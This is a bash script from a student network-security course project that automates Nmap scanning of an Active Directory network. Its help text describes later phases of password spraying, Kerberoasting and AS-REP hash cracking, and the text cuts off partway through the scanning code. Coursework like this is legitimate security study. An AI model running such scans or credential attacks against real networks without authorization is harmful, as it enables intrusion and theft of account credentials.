# DomainMapper
#!/bin/bash

# ==============================================================================
# SCRIPT METADATA
# ==============================================================================
# Project:      Network Security I - Domain Mapper
# Student Name: Vladimir Minkin 
# Student ID:   S12
# Class Code:   Peres-1024
# Lecturer:     Michael Kliot
# ==============================================================================
#
# DESCRIPTION:
# An automated script for scanning, enumerating, and performing basic
# exploitation tasks on an Active Directory network. It combines various
# security tools into a streamlined workflow.
#
# USAGE:
#   sudo bash ./Peres-1024.s12.zx305.sh
#   bash  ./Peres-1024.s12.zx305.sh --help
#
# ==============================================================================

# --- Auto-make executable ---
[ -x "$0" ] || chmod +x "$0"

# Removed 'set -e' to allow script to continue on tool errors.
set -uo pipefail

echo "Initializing Domain Mapper script..." # Debug line to check early output

# --- Function to display the help menu ---
show_help() {
    echo "Domain Mapper - Help Menu"
    echo "--------------------------------------------------------------------------------"
    echo "This script automates network scanning, enumeration, and exploitation tasks"
    echo "to map a target domain, identify vulnerabilities, and extract credentials."
    echo ""
    echo "Usage: sudo ./$(basename "$0") [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  --help          Display this help menu and exit."
    echo ""
    echo "Interactive Mode (Default if no arguments):"
    echo "  If run without arguments, the script will enter an interactive mode, prompting"
    echo "  you for the target network range, domain credentials, password list, and"
    echo "  desired operation levels for each phase."
    echo ""
    echo "Phases and Levels:"
    echo "  The script operates in three main phases: Scanning, Enumeration, and Exploitation."
    echo "  For each phase, you can select a level (0-3):"
    echo ""
    echo "  Level 0 (None): Skips the entire phase."
    echo ""
    echo "  Scanning Mode (Phase 2): Identifies live hosts and open ports."
    echo "    - Level 1 (Basic): Performs basic host discovery using Nmap's -Pn option"
    echo "                       to assume all hosts are online. Focuses on identifying reachable hosts."
    echo "    - Level 2 (Intermediate): Scans all 65535 TCP ports (-p-) on discovered live hosts"
    echo "                              for comprehensive TCP port identification."
    echo "    - Level 3 (Advanced): Includes UDP scanning (Masscan -pU:1-65535) for a thorough"
    echo "                          analysis of UDP services, in addition to TCP scanning."
    echo ""
    echo "  Enumeration Mode (Phase 3): Gathers detailed information about discovered services and the domain."
    echo "    - Level 1 (Basic): Identifies services (-sV) running on open TCP/UDP ports,"
    echo "                       attempts to identify the Domain Controller IP (via DNS SRV records"
    echo "                       and SMB enumeration), and identifies the DHCP server IP."
    echo "    - Level 2 (Intermediate): Expands on Basic by enumerating IPs for key services"
    echo "                              (FTP, SSH, SMB, WinRM, LDAP, RDP), enumerates shared folders"
    echo "                              (smb-enum-shares), runs three additional relevant NSE scripts"
    echo "                              (krb5-enum-users, smb-security-mode, ldap-rootdse), and performs"
    echo "                              unauthenticated SMB enumeration with enum4linux, and DNS SRV record enumeration with dig."
    echo "    - Level 3 (Advanced): Requires Active Directory credentials. Extracts all domain users,"
    echo "                          groups, shares, displays password policy, finds disabled accounts,"
    echo "                          never-expired accounts, and identifies Domain Admins group members"
    echo "                          using CrackMapExec."
    echo ""
    echo "  Exploitation Mode (Phase 4): Attempts to identify and exploit vulnerabilities."
    echo "    - Level 1 (Basic): Deploys the Nmap NSE vulnerability scanning script (--script vuln)"
    echo "                       to identify potential vulnerabilities."
    echo "    - Level 2 (Intermediate): Executes domain-wide password spraying using extracted users"
    echo "                              (if Advanced Enumeration was run) or provided AD credentials"
    echo "                              against a specified wordlist to identify weak credentials."
    echo "    - Level 3 (Advanced): Extracts and attempts to crack Kerberos tickets (Kerberoasting)"
    echo "                          and AS-REP hashes using Impacket tools and John The Ripper/Hashcat"
    echo "                          with the provided wordlist."
    echo ""
    echo "Output:"
    echo "  All scan results, enumeration findings, and exploitation outcomes are saved in"
    echo "  a timestamped output directory (e.g., 'domain_mapper_output_YYYYMMDD_HHMMSS')."
    echo "  A comprehensive PDF report summarizing the findings is generated using Pandoc."
    echo "  Individual log files for each phase are also available in the output directory."
    echo ""
    echo "Dependencies:"
    echo "  The script requires the following tools to be installed on your system:"
    echo "  nmap, crackmapexec, hydra, pandoc, sipcalc, masscan, john, hashcat,"
    echo "  enum4linux, dig, python3, impacket (specifically GetNPUsers, GetUserSPNs),"
    echo "  stdbuf."
    echo ""
    echo "Note: This script requires root privileges (sudo) for full functionality."
    echo "--------------------------------------------------------------------------------"
}

echo "Initializing Domain Mapper script..." # Debug line to check early output

# --- Function to display the help menu ---
show_help() {
    echo "Domain Mapper - Help Menu"
    echo "--------------------------------------------------------------------------------"
    echo "This script automates network scanning, enumeration, and exploitation tasks"
    echo "to map a target domain, identify vulnerabilities, and extract credentials."
    echo ""
    echo "Usage: sudo ./$(basename "$0") [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  --help          Display this help menu and exit."
    echo ""
    echo "Interactive Mode (Default if no arguments):"
    echo "  If run without arguments, the script will enter an interactive mode, prompting"
    echo "  you for the target network range, domain credentials, password list, and"
    echo "  desired operation levels for each phase."
    echo ""
    echo "Phases and Levels:"
    echo "  The script operates in three main phases: Scanning, Enumeration, and Exploitation."
    echo "  For each phase, you can select a level (0-3):"
    echo ""
    echo "  Level 0 (None): Skips the entire phase."
    echo ""
    echo "  Scanning Mode (Phase 2): Identifies live hosts and open ports."
    echo "    - Level 1 (Basic): Performs basic host discovery using Nmap's -Pn option"
    echo "                       to assume all hosts are online. Focuses on identifying reachable hosts."
    echo "    - Level 2 (Intermediate): Scans all 65535 TCP ports (-p-) on discovered live hosts"
    echo "                              for comprehensive TCP port identification."
    echo "    - Level 3 (Advanced): Includes UDP scanning (Masscan -pU:1-65535) for a thorough"
    echo "                          analysis of UDP services, in addition to TCP scanning."
    echo ""
    echo "  Enumeration Mode (Phase 3): Gathers detailed information about discovered services and the domain."
    echo "    - Level 1 (Basic): Identifies services (-sV) running on open TCP/UDP ports,"
    echo "                       attempts to identify the Domain Controller IP (via DNS SRV records"
    echo "                       and SMB enumeration), and identifies the DHCP server IP."
    echo "    - Level 2 (Intermediate): Expands on Basic by enumerating IPs for key services"
    echo "                              (FTP, SSH, SMB, WinRM, LDAP, RDP), enumerates shared folders"
    echo "                              (smb-enum-shares), runs three additional relevant NSE scripts"
    echo "                              (krb5-enum-users, smb-security-mode, ldap-rootdse), and performs"
    echo "                              unauthenticated SMB enumeration with enum4linux, and DNS SRV record enumeration with dig."
    echo "    - Level 3 (Advanced): Requires Active Directory credentials. Extracts all domain users,"
    echo "                          groups, shares, displays password policy, finds disabled accounts,"
    echo "                          never-expired accounts, and identifies Domain Admins group members"
    echo "                          using CrackMapExec."
    echo ""
    echo "  Exploitation Mode (Phase 4): Attempts to identify and exploit vulnerabilities."
    echo "    - Level 1 (Basic): Deploys the Nmap NSE vulnerability scanning script (--script vuln)"
    echo "                       to identify potential vulnerabilities."
    echo "    - Level 2 (Intermediate): Executes domain-wide password spraying using extracted users"
    echo "                              (if Advanced Enumeration was run) or provided AD credentials"
    echo "                              against a specified wordlist to identify weak credentials."
    echo "    - Level 3 (Advanced): Extracts and attempts to crack Kerberos tickets (Kerberoasting)"
    echo "                          and AS-REP hashes using Impacket tools and John The Ripper/Hashcat"
    echo "                          with the provided wordlist."
    echo ""
    echo "Output:"
    echo "  All scan results, enumeration findings, and exploitation outcomes are saved in"
    echo "  a timestamped output directory (e.g., 'domain_mapper_output_YYYYMMDD_HHMMSS')."
    echo "  A comprehensive PDF report summarizing the findings is generated using Pandoc."
    echo "  Individual log files for each phase are also available in the output directory."
    echo ""
    echo "Dependencies:"
    echo "  The script requires the following tools to be installed on your system:"
    echo "  nmap, crackmapexec, hydra, pandoc, sipcalc, masscan, john, hashcat,"
    echo "  enum4linux, dig, python3, impacket (specifically GetNPUsers, GetUserSPNs),"
    echo "  stdbuf."
    echo ""
    echo "Note: This script requires root privileges (sudo) for full functionality."
    echo "--------------------------------------------------------------------------------"
}



# --- Colors ---
GREEN=$'\033[0;32m'
YELLOW=$'\033[1;33m'
BLUE=$'\033[0;34m'
RED=$'\033[0;31m'
CYAN=$'\033[0;36m'
NC=$'\033[0m'


# --- Global Variables ---
TARGET_RANGE=""
AD_DOMAIN_NAME="" # Renamed from DOMAIN_NAME
AD_USER=""
AD_PASS=""
WORDLIST="/usr/share/wordlists/rockyou.txt" # Default wordlist


SCAN_LEVEL=0
ENUM_LEVEL=0
EXPLOIT_LEVEL=0

# New global variable for Nmap --stats-every
NMAP_STATS_EVERY_INTERVAL=""

# --- File Management ---
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")

# Define output directory path to be relative to the script's location
OUTPUT_DIR="$(dirname "$0")/domain_mapper_output_${TIMESTAMP}"
LOG_FILE="${OUTPUT_DIR}/script_log.txt" # Main script flow log

# New dedicated log files for each phase
SCANNING_LOG="${OUTPUT_DIR}/scanning_log.txt"
ENUMERATION_LOG="${OUTPUT_DIR}/enumeration_log.txt"
EXPLOITATION_LOG="${OUTPUT_DIR}/exploitation_log.txt"

# Consolidated service scan output file for 3.1.1
NMAP_ALL_SERVICE_SCAN_OUTPUT="${OUTPUT_DIR}/nmap_all_service_scan.txt"
# New dedicated Nmap service scan output files
NMAP_TCP_SERVICE_SCAN_OUTPUT="${OUTPUT_DIR}/nmap_tcp_service_scan.txt"
NMAP_UDP_SERVICE_SCAN_OUTPUT="${OUTPUT_DIR}/nmap_udp_service_scan.txt"


SUMMARY_FILE="${OUTPUT_DIR}/summary.md"
PDF_REPORT_FILE="${OUTPUT_DIR}/report_${TIMESTAMP}.pdf"

DOMAIN_CONTROLLER_IP="" # To store the Domain Controller IP once found
DC_HOSTNAME="" # To store the Domain Controller Hostname once found
DHCP_SERVER="" # To store the DHCP Server IP once found

# --- Report Data Storage (for summary generation) ---
# DISCOVERED_LIVE_HOSTS will be populated by the most comprehensive TCP scan (2.1 or 2.2) for general enumeration/exploitation.
DISCOVERED_LIVE_HOSTS="" 
DISCOVERED_LIVE_HOSTS_TCP_2_2="" # Hosts found alive and with open TCP ports during 2.2 scan
DISCOVERED_LIVE_HOSTS_UDP_2_3="" # Hosts found alive and with open UDP ports during 2.3 scan
DISCOVERED_TCP_PORTS="" # Renamed from DISCOVERED_OPEN_PORTS - Populated from intermediate/all_ports TCP scan in 2.2
DISCOVERED_UDP_PORTS="" # Populated from masscan UDP scan in 2.3
DISCOVERED_SMB_SHARES=""
DISCOVERED_DOMAIN_USERS=""
CRACKED_SPRAYED_CREDS=""
CRACKED_KERBEROAST_HASHS=""
CRACKED_ASREP_HASHS=""
VULNERABILITIES_FOUND=""

# Flag to track if the output directory was actually created
# Its purpose shifts to indicating if actual operations were *intended* to run.
OUTPUT_DIR_CREATED=0

# --- Spinner Variables ---
SPINNER_PID=""
SPINNER_ACTIVE=0
TAIL_PID="" # PID for the background tail -f process


# ==============================================================================
# HELPER FUNCTIONS
# ==============================================================================

# --- Function to handle script interruption (Ctrl+C) ---
cleanup_on_exit() {
    echo -e "\n\n${RED}[!] Script interrupted. Cleaning up...${NC}"
    # Ensure spinner is stopped, even if not active
    stop_spinner
    # Ensure background tail process is killed
    if [ -n "$TAIL_PID" ]; then
        kill "$TAIL_PID" &>/dev/null || true
        wait "$TAIL_PID" &>/dev/null || true
    fi
    exit 1
}

# --- Trap for graceful exit on interrupt ---
trap cleanup_on_exit INT TERM

# --- Function to print styled headers ---
print_header() {
    echo -e "\n${BLUE}======================================================================${NC}"
    echo -e "${BLUE}  $1${NC}"
    echo -e "${BLUE}======================================================================${NC}"
}

# --- Function to display progress/stage information ---
print_stage() {
    echo -e "\n${YELLOW}[*] STAGE: $1${NC}" # Kept as YELLOW for emphasis on stages
}

# --- Function to start a progress spinner with a message ---
start_spinner() {
    local message="$1" # Message to display with the spinner
    local i=0 # Initialize spinner index
    local delay=0.1
    local spin=( '-' '\\' '|' '/' )
    SPINNER_ACTIVE=1
    (
        # Changed spinner text color to CYAN for consistency with [i] messages
        while [ "$SPINNER_ACTIVE" -eq 1 ]; do
            echo -ne "\r${CYAN}[*] ${message} ${spin[i++ % ${#spin[@]}]}${NC}"
            sleep "$delay"
        done # Corrected from '}' to 'done'
        echo -ne "\r" # Clear the spinner line (cursor to start of line)
    ) &
    SPINNER_PID=$! # This correctly captures the PID of the background subshell
    disown
}

# --- Function to stop the progress spinner ---
stop_spinner() {
    if [ "$SPINNER_ACTIVE" -eq 1 ]; then
        SPINNER_ACTIVE=0
        if [ -n "$SPINNER_PID" ]; then
            kill "$SPINNER_PID" &>/dev/null || true # Add || true to prevent script exiting if spinner already dead
            wait "$SPINNER_PID" &>/dev/null || true
        fi
        echo -ne "\r\033[K" # Clear the entire spinner line
    fi
}

# --- Function to check for required dependencies ---
check_dependencies() {
    print_stage "Checking for required tools" | tee -a "$LOG_FILE"
    local missing_tools=0
    
    # Tools List
    local tools=("nmap" "crackmapexec" "hydra" "pandoc" "sipcalc" "masscan" "john" "hashcat" "enum4linux" "dig" "python3" "impacket-GetNPUsers" "impacket-GetUserSPNs" "tshark" )
    for tool in "${tools[@]}" ; do
        if ! command -v "$tool" &> /dev/null; then
            echo -e "${RED}[!] ERROR: Required tool '$tool' is not installed. Please install it to continue.${NC}" | tee -a "$LOG_FILE"
            missing_tools=1
        else
            echo -e "${GREEN}[+] Found tool: $tool${NC}" | tee -a "$LOG_FILE"
        fi
    done

    if [ "$missing_tools" -eq 1 ]; then
        exit 1
    fi
}

# --- Function to validate if a string is a valid IPv4 address
# This function checks if an IP is in the format A.B.C.D and if each octet is within 0-255.
is_valid_ipv4() {
    local ip=$1
    local stat=1
    # Regex to check the format A.B.C.D where A,B,C,D are 1-3 digits.
    if [[ "$ip" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        # Use IFS (Internal File Separator) to split the IP by dots.
        IFS='.' read -r i1 i2 i3 i4 <<< "$ip"
        # Check if each octet is a valid number between 0 and 255.
        if ((i1 <= 255 && i2 <= 255 && i3 <= 255 && i4 <= 255)); then
            stat=0 # Set status to 0 for success
        fi
    fi
    return "$stat" # Return the status (0 for valid, 1 for invalid)
}


# ==============================================================================
# INPUT & SETUP FUNCTIONS
# ==============================================================================

# --- Function to get a valid level selection from the user ---
get_level_input() {
    local mode_name=$1
    local level_var_name=$2
    local level_description
    local level_choice

    case "$mode_name" in
        "Scanning") level_description="0-None, 1-Basic, 2-Intermediate, 3-Advanced" ;;
        "Enumeration") level_description="0-None, 1-Basic, 2-Intermediate, 3-Advanced" ;;
        "Exploitation") level_description="0-None, 1-Basic, 2-Intermediate, 3-Advanced" ;;
        *) level_description="0-None, 1, 2, 3" ;; # Fallback for unexpected mode names
    esac

    while true; do
        echo -e "${YELLOW}${mode_name} - Enter level (${level_description}): ${NC}\c"
        read level_choice
        case "$level_choice" in
            [0-3])
                printf -v "$level_var_name" "%s" "$level_choice"
                break
                ;;
            *)
                echo -e "${RED}Invalid input. Please enter a number between 0 and 3.${NC}"
                ;;
        esac
    done
}

# --- Function to get all user inputs ---
get_user_input() {
    print_header "1. GETTING USER INPUT" | tee -a "$LOG_FILE"

    # 1.1. Prompt the user to enter the target network range for scanning.
    echo -e "${CYAN}[i] 1.1. Prompting for target network range.${NC}" | tee -a "$LOG_FILE"
    while true; do
        echo -e "${YELLOW}Enter the target network range for scanning (e.g., 192.168.1.0/24, 192.168.1.10-50, or 192.168.1.10-192.168.1.50): ${NC}\c"
        read temp_range
        
        # Check if input is empty
        if [[ -z "$temp_range" ]]; then
            echo -e "${RED}[!] Target network range cannot be empty. Please enter a value.${NC}" | tee -a "$LOG_FILE"
            continue # Ask again
        fi

        local is_valid=0

        # Attempt to validate as a single IP address (e.g., 192.168.1.10)
        # Use regex to match the format first, then validate octet values
        if [[ "$temp_range" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
            if is_valid_ipv4 "$temp_range"; then
                TARGET_RANGE="$temp_range"
                is_valid=1
                echo -e "${GREEN}[+] Valid single IP address: $TARGET_RANGE${NC}" | tee -a "$LOG_FILE"
            else
                echo -e "${RED}[!] Invalid IP address format or octet value: $temp_range${NC}" | tee -a "$LOG_FILE"
            fi
        # Attempt CIDR validation (e.g., 192.168.1.0/24)
        # Use regex to broadly match CIDR format (IP/mask) before calling sipcalc
        elif [[ "$temp_range" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}/([0-9]|[1-2][0-9]|3[0-2])$ ]]; then
            # sipcalc provides comprehensive CIDR validation (e.g., valid network address for a given mask)
            local sipcalc_cmd_array=(sipcalc "$temp_range")
            start_spinner "Validating CIDR range with sipcalc"
            echo # Newline after spinner start
            if "${sipcalc_cmd_array[@]}" >/dev/null 2>&1; then
                stop_spinner
                TARGET_RANGE="$temp_range"
                is_valid=1
                echo -e "${GREEN}[+] Valid CIDR network range: $TARGET_RANGE${NC}" | tee -a "$LOG_FILE"
            else
                stop_spinner
                echo -e "${RED}[!] Invalid CIDR network range (sipcalc validation failed). Check subnet mask and IP address validity: $temp_range${NC}" | tee -a "$LOG_FILE"
            fi
        # Attempt hyphenated IP range validation (e.g., 192.168.1.10-50 or 192.168.1.10-192.168.1.50)
        # Regex matches A.B.C.D-E or A.B.C.D-A.B.C.F
        elif [[ "$temp_range" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}-[0-9]{1,3}(\.[0-9]{1,3}){0,3}$ ]]; then
            # Split the range by hyphen
            IFS='-' read -r start_ip end_part <<< "$temp_range"

            local full_end_ip=""
            local range_valid_internal=0 # Flag for internal range validation

            # Validate the starting IP address of the range
            if is_valid_ipv4 "$start_ip"; then
                # Determine the full ending IP address
                if [[ "$end_part" =~ ^[0-9]{1,3}$ ]]; then
                    # Shorthand: 192.168.1.10-50 (end_part is just the last octet)
                    local prefix=$(echo "$start_ip" | cut -d'.' -f1-3)
                    full_end_ip="${prefix}.${end_part}"
                else
                    # Full IP range: 192.168.1.10-192.168.1.50
                    full_end_ip="$end_part"
                fi

                # Validate the full ending IP address
                if is_valid_ipv4 "$full_end_ip"; then
                    local start_last_octet=$(echo "$start_ip" | cut -d'.' -f4)
                    local end_last_octet=$(echo "$full_end_ip" | cut -d'.' -f4)
                    local start_prefix=$(echo "$full_end_ip" | cut -d'.' -f1-3)
                    local end_prefix=$(echo "$full_end_ip" | cut -d'.' -f1-3)

                    # Basic sanity check: if the first three octets are the same,
                    # the last octet of the start IP should not be greater than the end IP.
                    # Nmap can handle ranges across subnets (e.g., 192.168.1.250-192.168.2.10)
                    # so we only apply this specific check if the prefixes match.
                    if [[ "$start_prefix" == "$end_prefix" ]] && (( start_last_octet > end_last_octet )); then
                         echo -e "${RED}[!] Invalid IP range: Start IP ($start_ip) cannot be greater than End IP ($full_end_ip) in the same subnet segment.${NC}" | tee -a "$LOG_FILE"
                    else
                        TARGET_RANGE="$temp_range" # Nmap directly accepts this format
                        is_valid=1
                        echo -e "${GREEN}[+] Valid IP range: $TARGET_RANGE${NC}" | tee -a "$LOG_FILE"
                    fi
                else
                    echo -e "${RED}[!] Invalid ending IP address in range: $full_end_ip${NC}" | tee -a "$LOG_FILE"
                fi
            else
                echo -e "${RED}[!] Invalid starting IP address in range: $start_ip${NC}" | tee -a "$LOG_FILE"
            fi
        else
            echo -e "${RED}[!] Invalid input format. Please use CIDR (e.g., 10.10.10.0/24), a single IP (e.1.g., 10.10.10.10), or a valid IP range (e.g., 10.10.10.10-50, 10.10.10.10-10.10.10.50).${NC}" | tee -a "$LOG_FILE"
        fi

        # If after all checks, input is still not valid, prompt again.
        if [ "$is_valid" -eq 1 ]; then
            break # Exit loop on valid input
        else
            # Error message has already been printed by the specific validation checks above
            continue
        fi
    done


    # 1.2. Ask for the Domain name and Active Directory (AD) credentials.
    echo -e "${CYAN}[i] 1.2. Asking for Domain name and Active Directory (AD) credentials.${NC}" | tee -a "$LOG_FILE"
    echo -e "${CYAN}Note: Domain name and AD credentials are required for Advanced Enumeration (Level 3) and Exploitation (Level 3).${NC}" | tee -a "$LOG_FILE"
    # Made optional: Removed the while loop that forced non-empty input
    echo -e "${YELLOW}Enter the domain name (e.g., corp.local, leave blank for none): ${NC}\c"
    read AD_DOMAIN_NAME # Renamed from DOMAIN_NAME

    echo -e "${YELLOW}Enter AD Username (leave blank for none): ${NC}\c"
    read AD_USER
    if [[ -n "$AD_USER" ]]; then
        # Changed from read -sp to read for visible password input
        echo -e "${YELLOW}Enter AD Password: ${NC}\c"
        read AD_PASS # Changed to read to make password visible
        echo # Add a newline after the input
    fi

    # 1.3. Prompt the user to choose a password list, defaulting to Rockyou if none is specified.
    echo -e "${CYAN}[i] 1.3. Choose a password list.${NC}" | tee -a "$LOG_FILE"

    local initial_default_wordlist="$WORDLIST" # Store the initial default path

    # Check if the initial default wordlist exists
    if [ ! -f "$initial_default_wordlist" ]; then
        echo -e "${YELLOW}[!] WARNING: Default wordlist '${initial_default_wordlist}' not found on your system.${NC}" | tee -a "$LOG_FILE"
        echo -e "${YELLOW}You may need to install 'wordlists' package (e.g., 'sudo apt install wordlists') or provide a custom path.${NC}" | tee -a "$LOG_FILE"
    fi

    while true; do
        echo -e "${YELLOW}Enter path to custom password list (leave blank to use default: ${initial_default_wordlist}): ${NC}\c"
        read custom_wordlist_input

        if [[ -z "$custom_wordlist_input" ]]; then
            # User wants to use the default
            echo -e "${CYAN}[i] Using default wordlist: ${initial_default_wordlist}${NC}" | tee -a "$LOG_FILE"
            WORDLIST="$initial_default_wordlist" # Confirm using the initial default
            break # Exit loop
        else
            # User provided a custom path
            if [ -f "$custom_wordlist_input" ]; then
                WORDLIST="$custom_wordlist_input"
                echo -e "${GREEN}[+] Custom wordlist set: $WORDLIST${NC}" | tee -a "$LOG_FILE"
                break # Exit loop
            else
                echo -e "${RED}Invalid input. Custom wordlist file not found at: '$custom_wordlist_input'. Please try again or leave blank for default.${NC}" | tee -a "$LOG_FILE"
            fi
        fi
    done


    # 1.4. Require the user to select a desired operation level (Basic, Intermediate, Advanced or None) for each mode: Scanning, Enumeration, Exploitation.
    echo -e "${CYAN}[i] 1.4. Requiring selection of operation levels for each mode.${NC}" | tee -a "$LOG_FILE"
    while true; do
        echo -e "${YELLOW}Do you want Nmap to show progress updates during scans? (Enter interval like '5s', '1m', '2h', or leave blank for none): ${NC}\c"
        read NMAP_STATS_EVERY_INTERVAL_INPUT
        
        # Validate input: empty or matches Nmap's --stats-every format
        if [[ -z "$NMAP_STATS_EVERY_INTERVAL_INPUT" ]]; then
            NMAP_STATS_EVERY_INTERVAL="" # Set to empty if user left blank
            echo -e "${CYAN}[i] Nmap progress updates will be disabled.${NC}" | tee -a "$LOG_FILE"
            break
        elif [[ "$NMAP_STATS_EVERY_INTERVAL_INPUT" =~ ^[0-9]+[smh]$ ]]; then
            NMAP_STATS_EVERY_INTERVAL="$NMAP_STATS_EVERY_INTERVAL_INPUT"
            echo -e "${GREEN}[+] Nmap progress updates set to every $NMAP_STATS_EVERY_INTERVAL.${NC}" | tee -a "$LOG_FILE"
            break
        else
            echo -e "${RED}Invalid input. Please enter a number followed by 's' (seconds), 'm' (minutes), 'h' (hours), or leave blank.${NC}" | tee -a "$LOG_FILE"
        fi
    done

    get_level_input "Scanning" "SCAN_LEVEL"
    get_level_input "Enumeration" "ENUM_LEVEL"
    get_level_input "Exploitation" "EXPLOIT_LEVEL"
}

# ==============================================================================
# CORE LOGIC FUNCTIONS
# ==============================================================================

# --- 2. Scanning Mode: ---
run_scanning() {
    if [ "$SCAN_LEVEL" -eq 0 ]; then
        print_stage "2. Scanning Mode Skipped" | tee -a "$LOG_FILE"
        return
    fi 

    local level_name
    case "$SCAN_LEVEL" in
        1) level_name="Basic" ;;
        2) level_name="Intermediate" ;;
        3) level_name="Advanced" ;;
        *) level_name="Unknown" ;;
    esac
    print_stage "2. Scanning Mode (Level: $SCAN_LEVEL - $level_name)" | tee -a "$LOG_FILE"
    
    # These will hold the results of the most comprehensive TCP scan
    local nmap_final_tcp_scan_txt="${OUTPUT_DIR}/nmap_basic_scan.txt" 
    local nmap_final_tcp_scan_grep="${OUTPUT_DIR}/nmap_basic_scan.grep" 

    # 2.1. Basic: Use the -Pn option in Nmap to assume all hosts are online, bypassing the discovery phase.
    # This scan is primarily for identifying reachable hosts.
    echo -e "${CYAN}[i] 2.1. Performing basic host discovery with Nmap -Pn across the entire target range.${NC}" | tee -a "$LOG_FILE"
    
    # Clean up old Nmap output files before running
    rm -f "${OUTPUT_DIR}/nmap_basic_host_discovery.txt" "${OUTPUT_DIR}/nmap_basic_host_discovery.grep"

    start_spinner "Running Nmap basic host discovery"
    echo # Newline after spinner start
    local nmap_basic_cmd_array=(sudo nmap -Pn -T4 --min-rate 500 --max-retries 2 -oN "${OUTPUT_DIR}/nmap_basic_host_discovery.txt" -oG "${OUTPUT_DIR}/nmap_basic_host_discovery.grep" "$TARGET_RANGE")
    if [ -n "$NMAP_STATS_EVERY_INTERVAL" ]; then
        nmap_basic_cmd_array+=("--stats-every" "$NMAP_STATS_EVERY_INTERVAL")
    fi
    echo -e "${CYAN}Executing: ${BLUE}${nmap_basic_cmd_array[*]}${NC}" | tee -a "$SCANNING_LOG" # Log execution command
    { # Start block for teeing Nmap output
      echo "--- Nmap Basic Host Discovery Results ---" >> "$SCANNING_LOG" # Explicitly redirect header
      "${nmap_basic_cmd_array[@]}" 2>&1 | tee -a "$SCANNING_LOG"
    }
    local nmap_basic_host_exit_code=${PIPESTATUS[0]} # Captures exit code of Nmap itself
    stop_spinner
    echo # Ensure a clean line after spinner

    if [ "$nmap_basic_host_exit_code" -ne 0 ]; then 
        echo -e "${RED}[!] ERROR: Nmap basic host discovery failed with exit code $nmap_basic_host_exit_code. Verify target range and network access.${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
    fi

    # If SCAN_LEVEL is Basic, the initial host discovery IS the comprehensive TCP scan for now.
    if [ "$SCAN_LEVEL" -eq 1 ]; then
        cp "${OUTPUT_DIR}/nmap_basic_host_discovery.txt" "$nmap_final_tcp_scan_txt"
        cp "${OUTPUT_DIR}/nmap_basic_host_discovery.grep" "$nmap_final_tcp_scan_grep"
    fi

    # Populate global DISCOVERED_LIVE_HOSTS (general live hosts for other modules)
    # This ensures DISCOVERED_LIVE_HOSTS reflects hosts found 'Up' by 2.1
    DISCOVERED_LIVE_HOSTS=$(grep "Status: Up" "${OUTPUT_DIR}/nmap_basic_host_discovery.grep" | awk '{print $2}' | paste -s -d, -)
    if [ -n "$DISCOVERED_LIVE_HOSTS" ]; then
        echo -e "${GREEN}[+] Online hosts found from Basic Host Discovery (2.1): $DISCOVERED_LIVE_HOSTS${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
    else
        echo -e "${YELLOW}[!] No online hosts detected by Basic Host Discovery (2.1).${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
    fi


    # 2.2. Intermediate: Scan all 65535 TCP ports.
    if [ "$SCAN_LEVEL" -ge 2 ]; then
        local tcp_scan_target
        if [ -z "$DISCOVERED_LIVE_HOSTS" ]; then
            echo -e "${YELLOW}[!] WARNING: No online hosts found from Basic Host Discovery (2.1). Falling back to scanning the entire target range ($TARGET_RANGE) for Intermediate TCP scan (2.2).${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
            tcp_scan_target="$TARGET_RANGE"
        else
            echo -e "${CYAN}[i] 2.2. Executing Intermediate Scanning: Scanning all 65535 TCP ports on *online IPs from 2.1* with Nmap (-p-). With aggressive speed flags (-T4 --min-rate 1000 --max-retries 2). ${NC}" | tee -a "$LOG_FILE"
            tcp_scan_target="$DISCOVERED_LIVE_HOSTS"
        fi

        # Clean up old Nmap output files before running
        rm -f "${OUTPUT_DIR}/nmap_intermediate_scan.txt" "${OUTPUT_DIR}/nmap_intermediate_scan.grep"

        start_spinner "Running Nmap Intermediate TCP scan (all ports)"
        echo # Newline after spinner start
        local nmap_intermediate_cmd_array=(sudo nmap -p- -T4 --min-rate 1000 --max-retries 2 -oN "${OUTPUT_DIR}/nmap_intermediate_scan.txt" -oG "${OUTPUT_DIR}/nmap_intermediate_scan.grep")
        if [ -n "$NMAP_STATS_EVERY_INTERVAL" ]; then
            nmap_intermediate_cmd_array+=("--stats-every" "$NMAP_STATS_EVERY_INTERVAL")
        fi
        echo -e "${CYAN}Executing: ${BLUE}${nmap_intermediate_cmd_array[*]} $(echo "$tcp_scan_target" | tr ',' ' ')${NC}" | tee -a "$SCANNING_LOG"
        { # Start block for teeing Nmap output
          echo "--- Nmap Intermediate TCP Scan Results (All Ports) ---" >> "$SCANNING_LOG" # Explicitly redirect header
          "${nmap_intermediate_cmd_array[@]}" $(echo "$tcp_scan_target" | tr ',' ' ') 2>&1 | tee -a "$SCANNING_LOG"
        }
        local nmap_intermediate_exit_code=${PIPESTATUS[0]}
        stop_spinner
        echo # Ensure a clean line after spinner

        if [ "$nmap_intermediate_exit_code" -ne 0 ]; then 
            echo -e "${RED}[!] ERROR: Nmap Intermediate TCP scan failed with exit code $nmap_intermediate_exit_code. Verify target range and network access.${NC}" | tee -a "$LOG_FILE" | tee -a "$SCANNING_LOG"
        fi

        # If SCAN_LEVEL is 2 or higher, this intermediate scan becomes the most comprehensive TCP scan result
        cp "${OUTPUT_DIR}/nmap_intermediate_scan.txt" "$nmap_final_tcp_scan_txt"
        cp "${OUTPUT_DIR}/nmap_intermediate_scan.grep" "$nmap_final_tcp_scan_grep"

        # Populate DISCOVERED_LIVE_HOSTS_TCP_2_2 with hosts that responded with open ports to the full TCP scan (2.2)
        DISCOVERED_LIVE_HOSTS_TCP_2_2=$(grep "open" "${OUTPUT_DIR}/nmap_intermediate_scan.grep" | awk '{print $2}' | sort | uniq | paste -s -d, -)
        if [ -z "$DISCOVERED_LIVE_HOSTS_TCP_2_2" ]; then
